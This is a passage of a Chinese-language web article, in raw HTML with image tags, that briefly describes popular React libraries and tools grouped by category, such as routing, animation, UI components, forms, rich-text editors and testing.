文件即可。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625158061-6984b773-f55d-430a-8ace-49e7cdfcf1ba.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625158061-6984b773-f55d-430a-8ace-49e7cdfcf1ba.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Storybook</strong><br />Storybook 是 UI 组件的开发环境，它允许开发者浏览组件库，查看每个组件的不同状态，以及交互地开发和测试组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625242414-a9892d68-35a5-4486-9ba4-a738d3cad1d1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625242414-a9892d68-35a5-4486-9ba4-a738d3cad1d1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Styleguidist</strong><br />React Styleguidist 是一个 React 设计规范生成器，一个本地组件开发环境，支持热重载，共享的设计规范。它会列出了组件 propTypes，并基于 Markdown 文件显示可编辑的实时使用示例。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625388407-8ba2a64c-0bfd-4d0d-a371-84c79b999539.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625388407-8ba2a64c-0bfd-4d0d-a371-84c79b999539.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>3、路由</strong><br /><strong>（1）React Router</strong><br />React Router 是完整的 React 路由解决方案。React Router 保持 UI 与 URL 同步。它拥有简单的 API 与强大的功能例如代码缓冲加载、动态路由匹配、以及建立正确的位置过渡处理。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/1500604/1659623826534-3239472c-5e96-4fed-869e-40ab485ee5b1.webp" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/webp/1500604/1659623826534-3239472c-5e96-4fed-869e-40ab485ee5b1.webp" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React Location</strong><br />React Location 是客户端 React 应用程序的路由器。它支持异步路由、深度集成的搜索参数 API、可选的 JSX 路由定义、用于路由加载器缓存的预打包简单缓存实现、带有外部缓存和存储的轻松集成等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623883093-6eaf5b0d-5612-438b-8987-00747ba39657.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659623883093-6eaf5b0d-5612-438b-8987-00747ba39657.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>4、脚手架</strong><br /><strong>（1）Create React App</strong><br />Create React App 是一种官方支持的创建单页 React 应用程序的方式。它提供了一个没有配置的现代构建设置。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624007783-5b261991-b61e-43ab-bcea-8940b75ba621.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624007783-5b261991-b61e-43ab-bcea-8940b75ba621.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Rekit</strong><br />Rekit 是开源的一个脚手架，用于使用 React、Redux 和 React-router 构建可扩展的 Web 应用程序。它可以帮助开发人员专注于业务逻辑，而不是处理大量的库、模式、配置等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624254667-e2b02254-dd61-47ae-a5bb-7d3744df5bdb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624254667-e2b02254-dd61-47ae-a5bb-7d3744df5bdb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>5、应用调试</strong><br /><strong>（1）React Developer Tools</strong><br />React Devtools 可以在 Chrome 和 Firefox 开发者工具审查 React 组件的浏览器扩展。可以用于检查 React 组件层次结构，在页面上显示 React 组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624362010-fbc8f4c1-2cfd-4e15-870d-0a919077f73b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624362010-fbc8f4c1-2cfd-4e15-870d-0a919077f73b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Why Did You Render</strong><br />Why Did You Render 是由 Welldone Software 开发的，可以在开发的时候就检测到一些不必要的渲染问题，告诉我们当前渲染是什么原因导致的。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622826859-f22252b9-f21a-4987-8f2a-7334581d93a3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622826859-f22252b9-f21a-4987-8f2a-7334581d93a3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>6、动画</strong><br /><strong>（1）Animate.css</strong><br />animate.css 是一个使用 CSS3 的 animation 制作的动画效果的 CSS 集合，里面预设了很多种常用的动画，且使用非常简单。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627823935-e9f09cff-8b4d-4fed-aad8-018aa93d4d9b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627823935-e9f09cff-8b4d-4fed-aad8-018aa93d4d9b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React Spring</strong><br />react-spring 是一个基于弹簧物理学的动画库，满足大多数与 UI 相关的动画需求，提供了足够灵活的工具，可以自信地将想法投射到不断变化的界面中。该库代表了一种现代动画方法。它继承了 animated 强大的插值和性能，以及 react-motion 的易用性。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627719149-06917885-e966-401f-b69b-8d01bb19f3ed.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627719149-06917885-e966-401f-b69b-8d01bb19f3ed.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Reveal</strong><br />React Reveal 是一个用于 React 的高性能动画库。它占用空间小，专门为 ES6 中的 React 编写。可用于创建各种炫酷的滚动效果显<img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627757718-0ad92ecf-0bdb-4d10-8c45-7b683f357b87.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627757718-0ad92ecf-0bdb-4d10-8c45-7b683f357b87.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/rnosov/react-reveal">https://github.com/rnosov/react-reveal</a></p><p><strong>（4）React-Motion</strong><br />React-Motion 是一个动画库，拥有一种更轻松的方法来创建和实现逼真的动画。它利用物理学来为 React 元素创建几乎自然的动画。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629685780-7bec1943-43a3-4654-a095-741763db9004.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629685780-7bec1943-43a3-4654-a095-741763db9004.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>7、可视化</strong><br /><strong>（1）Apache ECharts</strong><br />Apache ECharts 是一款基于 Javascript 的数据可视化图表库，提供直观，生动，可交互，可个性化定制的数据可视化图表。它是用纯 JavaScript 编写的，基于 zrender，是一个全新的轻量级画布库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626661082-2ae6dc8a-d0a4-447c-a3ec-41f33305f057.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626661082-2ae6dc8a-d0a4-447c-a3ec-41f33305f057.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Recharts</strong><br />Recharts 是一个用 React 和 D3 构建的、重新定义的图表库。该库的主要目的是在 React 应用程序中轻松编写图表。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626691898-90432456-3263-4cfe-9d6c-5beda120e6e7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626691898-90432456-3263-4cfe-9d6c-5beda120e6e7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）react-vis</strong><br />react-vis 是一组用于呈现常见数据可视化图表的 react 组件，例如折线图&#x2F;面积图&#x2F;条形图、热图、散点图、等高线图、六边形热图、饼图和圆环图、旭日形图、雷达图、平行坐标和树形图。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626765054-8ab6e054-e28f-49a0-b7f6-daac1d1f2814.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626765054-8ab6e054-e28f-49a0-b7f6-daac1d1f2814.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>8、UI 组件</strong><br /><strong>（1）Ant Design</strong><br />GitHub 上超过 269 k 个项目使用了 Ant Design 组件库，Ant Design of React 是一个基于 Ant Design 设计体系的 React UI 组件库，主要用于研发企业级中后台产品。Ant Design 提供了大量高质量的组件，非常适合快速构建整个 UI 框架，也可以只使用单个组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627209475-2aa8d171-5188-4475-95ec-7c82f22dcae6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627209475-2aa8d171-5188-4475-95ec-7c82f22dcae6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）MUI</strong><br />MUI 是一个基于 Google 的 Material Design 的简单且可定制的 React 组件库。MUI 不仅是一个组件库，而是一个完整的设计系统。它具有一套完整的指南、设计原则和 UI 设计最佳实践系统。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627326985-59e81a3b-948e-4373-b402-1a9c206e5cb9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627326985-59e81a3b-948e-4373-b402-1a9c206e5cb9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Bootstrap</strong><br />React-Bootstrap，是比较古老的 React UI 组件库之一。它是使用 React 来重新构建了前端框架 Bootstrap。该库由完全响应并且可访问的现成的组件组成。所有设计元素都是高度可定制的。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627626082-3d969ead-b715-4c8b-a518-d4b6a9a2de21.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627626082-3d969ead-b715-4c8b-a518-d4b6a9a2de21.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>9、性能优化</strong><br /><strong>（1）React Virtualized</strong><br />React Virtualized 是一个以高效渲染大型列表和表格数据的响应式组件，可以用来解决长列表渲染问题。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628708101-b50b95ef-9cd1-4c52-b239-48363c1b3236.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628708101-b50b95ef-9cd1-4c52-b239-48363c1b3236.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React Window</strong><br />React Window 是用于高效渲染大型列表和表格数据的 React 组件。通过仅渲染大型数据集的一部分（刚好足以填充满视口）来工作。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629884077-ce9fcfeb-1e7b-47ae-9c6c-cb1eac6d34ad.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629884077-ce9fcfeb-1e7b-47ae-9c6c-cb1eac6d34ad.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>10、表单</strong><br /><strong>（1）React Hook Form</strong><br />React Hook Form 是一个高性能、灵活、易拓展、易于使用的表单校验库，用于 React Web 和 React Native 的表单验证。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628331580-040f8010-42ac-4382-b772-b2f37f9d71eb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628331580-040f8010-42ac-4382-b772-b2f37f9d71eb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Formik</strong><br />Formik 是一个可以在 React 中构建表单的组件。它旨在轻松管理具有复杂验证的表单，支持同步和异步表单级和字段级验证。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628491386-babf6236-717c-4b5d-ac8f-85f727dbe68a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628491386-babf6236-717c-4b5d-ac8f-85f727dbe68a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）React Final Form</strong><br />React Final Form 是 Final Form 的一个精简 React 包装器，它是一个基于订阅的表单状态管理库，使用观察者模式，因此只有需要更新的组件会随着表单状态的变化而重新渲染。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628589263-8999e454-3825-44d8-824f-72e4c6f85098.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628589263-8999e454-3825-44d8-824f-72e4c6f85098.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>11、富文本编辑器</strong><br /><strong>（1）Draft.js</strong><br />Draft.js 是 Facebook 的一个开源项目，是 React 项目首选的富文本编辑器框架。这是一个健壮、可扩展和可定制的框架。Draft.js 遵循与 React 中的受控组件相同的范例，并提供了一个 Editor 呈现富文本输入的组件。它还公开了一个 EditorStateAPI 来处理&#x2F;存储 Editor 组件中的状态更新。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626895080-58dd4d74-8fd8-45f8-a404-7db48cd155c7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626895080-58dd4d74-8fd8-45f8-a404-7db48cd155c7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Slate.js</strong><br />Slate.js 是受 Draft.js 启发的富文本编辑器。它是一个可深度定制的富编辑器框架，专用于 React。与 Draft.js 类似，它具有良好的 API、强大的插件基础设施以及与 React 的深度连接。此外，插件生态系统比 Draft.js 小一些，但它的插件质量会更好。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626957073-9ac22d04-0bf8-441d-95d5-4ff9d5616ad6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659626957073-9ac22d04-0bf8-441d-95d5-4ff9d5616ad6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）TinyMCE</strong><br />TinyMCE 是一个热门的富文本编辑器。它的目标是帮助其他开发人员构建精美的 Web 内容解决方案。它易于集成，可以部署在基于云的、自托管或混合环境中。该设置使得合并诸如 Angular、React 和 Vue 等框架成为可能。它还可以使用 50 多个插件进行扩展，每个插件都有 100 多个自定义选项。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627018874-2538f8e0-4d93-4442-bc43-204c02bbeacf.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627018874-2538f8e0-4d93-4442-bc43-204c02bbeacf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（4）wangEditor</strong><br />wangEditor 是一个使用 Typescript 开发的 Web 富文本编辑器， 轻量、简洁、易用、开源免费。它兼容常见的 PC 浏览器：Chrome，Firefox，Safar，Edge，QQ 浏览器，IE11。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627128764-7e4d9fef-8c21-4ecb-a60a-1178e9e7eb90.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659627128764-7e4d9fef-8c21-4ecb-a60a-1178e9e7eb90.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>12、CSS in JS</strong><br /><strong>（1）Styled–Components</strong><br />styled-components 可以在 JavaScript 代码中使用 CSS 来设置 React 组件的样式。通过这个库可以自定义组件的样式，它会将给定的样式包装成一个组件，可以直接使用这个组件，也不需要组件和样式之间的映射，即创建后就是一个正常的 React 组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629425277-2395fbc6-96c9-40cd-bcf3-d448d0944564.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629425277-2395fbc6-96c9-40cd-bcf3-d448d0944564.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）Emotion</strong><br />Emotion 是一个高性能且灵活的 CSS-in-JS 库。基于许多其他 CSS-in-JS 库，它允许开发人员使用字符串或对象样式快速设置应用样式。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629210965-2a64670e-cd04-479b-8233-9c6e892bc8d7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629210965-2a64670e-cd04-479b-8233-9c6e892bc8d7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>13、数据请求</strong><br /><strong>（1）Axios</strong><br />Axios 是一个基于 promise 网络请求库，作用于 node.js 和浏览器中。 它是 isomorphic 的(即同一套代码可以运行在浏览器和 node.js 中)。在服务端它使用原生 node.js http 模块，而在客户端 (浏览端) 则使用 XMLHttpRequests。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628850112-88db8b6d-893d-4bf6-b09d-68a59fa84656.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659628850112-88db8b6d-893d-4bf6-b09d-68a59fa84656.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React Query</strong><br />React Query 是一个适用于 react hooks 的请求库，它可以为任何类型的异步数据提供 React 状态管理功能，使 React 中的获取、缓存、同步和更新服务器数据变得轻而易举。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629045249-67dfcc4e-7f4c-433d-a2b3-f47f5022dda0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659629045249-67dfcc4e-7f4c-433d-a2b3-f47f5022dda0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>14、测试</strong><br /><strong>（1）Jest</strong><br />Jest 是由 Facebook 开发的 JavaScript 测试框架。它应该是测试 React 的首选，因为它是由 React 的发明者创建的，并且得到了 React 社区的支持和开发。它还支持 Babel、TypeScript、Node、Angular 和 Vue 以及其他 JS 框架。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624570394-2473b035-c0fe-4dd3-a2e7-4eea4737fc17.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624570394-2473b035-c0fe-4dd3-a2e7-4eea4737fc17.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（2）React Testing Library</strong><br />React Testing Library 基于 DOM Testing Library 的基础上添加一些 API，主要用于测试 React 组件。该库在使用过程并不关注组件的内部实现，而是更关注测试。该库基于 react-dom 和 react-dom&#x2F;test-utils，是以上两者的轻量实现。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624741784-d4c6ce19-875e-4f47-9a70-f58c81b2925e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659624741784-d4c6ce19-875e-4f47-9a70-f58c81b2925e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>（3）Vitest</strong><br />Vitest 是一个由 Vite 提供支持的极速单元测试框架。其和 Vite 的配置、转换器、解析器和插件保持一致、开箱即用的 TypeScript &#x2F; JSX 支持、支持 Smart 和 instant watch 模式，如同用于测试的 HMR、内置 Tinyspy 用于模拟、打标和监察等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625017469-b90d5172-7866-49e6-9b27-9d1d2744176e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659625017469-b90d5172-7866-49e6-9b27-9d1d2744176e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>15、自定义 Hooks</strong><br /><strong>（1）Ahooks</strong><br />ahooks 是一套由阿里巴巴开源的 React Hooks 库，封装了大量好用的 Hooks。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1659622548861-c18e9673-9685-4dfb-a5f0-d41ee3db7857.png" class="lazyload placeholder" 